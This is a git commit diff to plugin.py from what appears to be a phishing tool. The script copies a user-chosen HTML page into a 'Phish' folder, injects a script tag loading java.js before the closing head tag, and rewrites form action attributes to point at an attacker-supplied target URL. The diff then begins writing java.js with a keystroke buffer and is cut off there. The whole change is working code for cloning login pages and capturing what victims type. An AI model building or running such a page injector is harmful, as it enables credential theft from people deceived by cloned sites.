e5d4cc42e3cd8e07b8a3bcf201dd2176d23d055f
Out-Shit <70829667+Out-Shit@users.noreply.github.com>
2020-10-02 10:51:27 +0000

    Update plugin.py

--- plugin.py
+++ plugin.py
@@ -15,7 +15,7 @@ def draw():
     print("""\__ \ / // _` | '  \()  ' </ -_)| || | """)
     print("""|___/_\_\\__,_|_|_|_|  _|\_\___| \_, | """)
     print("""                                 |__/  """+S11)
-
+target = input(S12+'Target page >  ')
 def clear(numlines=100):
   print(S10)
   if os.name == "posix":
@@ -31,44 +31,70 @@ def clear(numlines=100):
     draw()
 
 clear()
-target =input(S12+'Target Page > '+S10)
 flu=input(S12+'Enter the .html file >  '+S10)
 fle = "Phish/"+flu
 clear()
 print('\n\nCreating Phish directory\n\n'+S10+'Run 2 time if is the first time\n'+S11)
 os.system('cp '+flu+' '+fle)
+
+
 TxS= """</head>"""
 TxR= """<script src="java.js"></script></head>"""
-TpF =open(fle,'r+')
-for line in fileinput.input(fle):
-    if TxS in line :
-        print(S10+'\nMatch Found!!!!! </head>\n')
-        TpF.write(line.replace(TxS,TxR))
-TpF.close()
 TxS1= """</HEAD>"""
 TxR1= """<script src="java.js"></script></HEAD>"""
+TxS2= 'action="/'
+TxR2= ('action="'+target+'/')
+TxS3= "action='/"
+TxR3= ("action='"+target+'/')
+clear()
+input(S12+'continue for: '+TxS+S11)
+clear()
 TpF =open(fle,'r+')
 for line in fileinput.input(fle):
     if TxS in line :
-        print(S10+'\nMatch Found!!!!! </HEAD>\n')
-        TpF.write(line.replace(TxS1,TxR1))
+        print(S10+'find: '+TxS)
+        print(S12+'replaced: '+TxR+S11)
+    else:
+        print('find: nothing')
+    TpF.write(line.replace(TxS,TxR))
 TpF.close()
-TxS2= """action='/"""
-TxR2= ("""action='"""+target+"""/""")
-TpF =open(fle,'r+')
+
+input(S12+'continue for: '+TxS1+S11)
+clear()
+TpF1 =open(fle,'r+')
 for line in fileinput.input(fle):
-    if TxS in line :
-        print(S10+"\nMatch Found!!!!! action='/\n")
-        TpF.write(line.replace(TxS2,TxR2))
-TpF.close()
-TxS3= 'action="/'
-TxR3= ('action="'+target+'/')
-TpF =open(fle,'r+')
+    if TxS1 in line :
+        print(S10+'find: '+TxS1)
+        print(S12+'replaced: '+TxR1+S11)
+    else:
+        print('find: nothing')
+    TpF1.write(line.replace(TxS1,TxR1))
+TpF1.close()
+
+input(S12+'continue for: '+TxS2+S11)
+clear()
+TpF2 =open(fle,'r+')
 for line in fileinput.input(fle):
-    if TxS in line :
-        print(S10+'\nMatch Found!!!!! action="/\n')
-        TpF.write(line.replace(TxS3,TxR3))
-TpF.close()
+    if TxS2 in line :
+        print(S10+'find: '+TxS2)
+        print(S12+'replaced: '+TxR2+S11)
+    else:
+        print('find: nothing')
+    TpF2.write(line.replace(TxS2,TxR2))
+TpF2.close()
+
+input(S12+'continue for: '+TxS3+S11)
+clear()
+TpF3 =open(fle,'r+')
+for line in fileinput.input(fle):
+    if TxS3 in line :
+        print(S10+'find: '+TxS3)
+        print(S12+'replaced: '+TxR3+S11)
+    else:
+        print('find: nothing')
+    TpF3.write(line.replace(TxS3,TxR3))
+TpF3.close()
+
 w = open("Phish/java.js", "w")
 w.write("""
 var buffer = [];
